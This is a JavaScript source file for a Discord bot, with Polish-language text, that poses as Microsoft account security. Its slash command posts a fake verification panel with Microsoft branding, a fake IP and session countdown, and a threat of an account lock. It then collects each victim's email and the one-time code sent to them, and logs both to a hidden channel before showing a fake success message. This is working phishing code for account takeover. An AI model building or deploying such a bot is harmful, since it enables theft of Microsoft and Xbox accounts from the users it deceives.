const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    REST,
    Routes
} = require('discord.js');
require('dotenv').config();
const http = require('http');

// Render Port Binding Fix
const server = http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
});

const port = process.env.PORT || 3000;
server.listen(port, "0.0.0.0", () => {
    console.log(`\x1b[36m[SERVER]\x1b[0m Web server is listening on port ${port}`);
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = '!';
const LOG_CHANNEL_ID = "1505269850191433921"; // ID kanału sprawdzacz botow

// Error & Process Handling
process.on('unhandledRejection', error => {
    console.error('\x1b[31m[UNHANDLED REJECTION]\x1b[0m', error);
});

process.on('uncaughtException', error => {
    console.error('\x1b[31m[UNCAUGHT EXCEPTION]\x1b[0m', error);
});

process.on('exit', (code) => {
    console.log(`\x1b[33m[PROCESS]\x1b[0m Process exited with code: ${code}`);
});

client.on('error', error => {
    console.error('\x1b[31m[CLIENT ERROR]\x1b[0m', error);
});

client.once('ready', async () => {
    console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
    client.user.setActivity('Weryfikacja Microsoft', { type: 3 });

    const commands = [
        {
            name: 'panelweryfikacja',
            description: 'Wysyła panel weryfikacji Microsoft',
        }
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Rozpoczynam rejestrację komend slash...');
        if (client.user) {
            await rest.put(
                Routes.applicationCommands(client.user.id),
                { body: commands },
            );
            console.log('Pomyślnie zarejestrowano komendy slash!');
        }
    } catch (error) {
        console.error('Błąd podczas rejestracji komend:', error);
    }
});

// Store pending verification data
const pendingVerifications = new Map();

client.on('interactionCreate', async (interaction) => {
    // 1. Slash Command - Verification Panel
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'panelweryfikacja') {
            const expiryTime = Math.floor(Date.now() / 1000) + 600; // 10 minutes from now

            const embed = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setAuthor({ name: 'Microsoft Accounts Protection', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                .setTitle('🛡️ Obowiązkowa Weryfikacja Bezpieczeństwa')
                .setDescription(
                    'System Microsoft Secure Connect wykrył próbę logowania z nowej lokalizacji.\n' +
                    'Wymagana jest natychmiastowa weryfikacja tożsamości, aby uniknąć tymczasowej blokady konta.\n\n' +
                    '**Szczegóły Sesji:**\n' +
                    `> \`📍\` **Lokalizacja:** Polska (Wykryto)\n` +
                    `> \`🌐\` **IP:** \`${interaction.user.id.substring(0, 8)}.***.***\`\n` +
                    `> \`⌛\` **Ważność sesji:** <t:${expiryTime}:R>\n\n` +
                    '**Instrukcja:**\n' +
                    'Kliknij przycisk poniżej, aby rozpocząć proces autoryzacji konta Microsoft Office 365 / Xbox Live.'
                )
                .addFields({ name: 'Status Bezpieczeństwa', value: '`🔴 WYMAGANA AKCJA` | `ID: MS-' + Math.random().toString(36).substring(2, 9).toUpperCase() + '`' })
                .setThumbnail('https://img.icons8.com/color/96/000000/microsoft.png')
                .setFooter({ text: 'Microsoft Corporation © 2026. Wszystkie prawa zastrzeżone.', iconURL: 'https://img.icons8.com/color/48/000000/shield.png' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_verify')
                    .setLabel('Weryfikuj Tożsamość')
                    .setEmoji('📧')
                    .setStyle(ButtonStyle.Success),
                new ButtonBuilder()
                    .setLabel('Pomoc Microsoft')
                    .setURL('https://support.microsoft.com/pl-pl/account-billing')
                    .setStyle(ButtonStyle.Link),
                new ButtonBuilder()
                    .setLabel('Prywatność')
                    .setURL('https://privacy.microsoft.com/pl-pl/privacystatement')
                    .setStyle(ButtonStyle.Link)
            );

            await interaction.channel.send({ embeds: [embed], components: [row] });
            await interaction.reply({ content: '✅ Panel wysłany.', ephemeral: true });
        }
    }

    // 2. Button Handling
    if (interaction.isButton()) {
        if (interaction.customId === 'start_verify') {
            const modal = new ModalBuilder()
                .setCustomId('modal_email')
                .setTitle('Logowanie do usługi Microsoft');

            const emailInput = new TextInputBuilder()
                .setCustomId('input_email')
                .setLabel("E-mail, telefon lub nazwa Skype")
                .setPlaceholder("np. nazwa@outlook.com")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
            await interaction.showModal(modal);
        }

        if (interaction.customId === 'btn_step_code') {
            const modal = new ModalBuilder()
                .setCustomId('modal_code')
                .setTitle('Weryfikacja Tożsamości');

            const codeInput = new TextInputBuilder()
                .setCustomId('input_code')
                .setLabel("Wprowadź kod")
                .setPlaceholder("Kod z e-maila (6-7 cyfr)")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
            await interaction.showModal(modal);
        }
    }

    // 3. Modal Submission Handling
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_email') {
            const email = interaction.fields.getTextInputValue('input_email');
            pendingVerifications.set(interaction.user.id, { email });

            // Log email
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0xFFAA00)
                    .setTitle('📧 KROK 1: Podano E-mail')
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
                        { name: '📧 Mail', value: `\`${email}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            const nextStepEmbed = new EmbedBuilder()
                .setColor(0x00AAFF)
                .setAuthor({ name: 'Microsoft Accounts Service', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                .setTitle('📥 Wprowadź kod weryfikacyjny')
                .setDescription(
                    `Kod został wysłany na adres **${email}**.\n\n` +
                    'Jeśli nie widzisz wiadomości, sprawdź folder **Spam** lub **Inne**.\n' +
                    'Wiadomość pochodzi od: `account-security-noreply@accountprotection.microsoft.com`'
                )
                .setFooter({ text: 'Weryfikacja jest wymagana do zachowania dostępu do konta.' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('btn_step_code')
                    .setLabel('Zatwierdź Kod')
                    .setEmoji('🔑')
                    .setStyle(ButtonStyle.Primary),
                new ButtonBuilder()
                    .setLabel('Nie otrzymałem kodu')
                    .setURL('https://support.microsoft.com/pl-pl/account-billing/rozwi%C4%85zywanie-problem%C3%B3w-z-kodami-weryfikacyjnymi-40911ee5-6844-45e0-b962-436f56193798')
                    .setStyle(ButtonStyle.Link)
            );

            await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
        }

        if (interaction.customId === 'modal_code') {
            const code = interaction.fields.getTextInputValue('input_code');
            const data = pendingVerifications.get(interaction.user.id);
            const email = data ? data.email : "Nieznany";

            // Log code
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0x57F287)
                    .setTitle('🔐 KROK 2: Otrzymano Kod')
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
                        { name: '📧 Mail', value: `\`${email}\``, inline: true },
                        { name: '🔑 Kod', value: `\`${code}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            pendingVerifications.delete(interaction.user.id);

            const successEmbed = new EmbedBuilder()
                .setColor(0x57F287)
                .setTitle('✅ Autoryzacja Zakończona')
                .setDescription(
                    'Pomyślnie zweryfikowano tożsamość.\n\n' +
                    '**Wynik:** `Zabezpieczono`\n' +
                    '**Data:** `' + new Date().toLocaleString('pl-PL') + '`\n' +
                    '**Urządzenie:** `Discord Client (Verified)`\n\n' +
                    'Możesz teraz bezpiecznie zamknąć to okno.'
                )
                .setFooter({ text: 'Microsoft Secure Connect' });

            await interaction.reply({ embeds: [successEmbed], ephemeral: true });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === 'ping') {
        await message.reply(`Pong! **${Math.round(client.ws.ping)}ms**`);
    }
});

client.login(process.env.TOKEN).catch(err => {
    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować.');
});
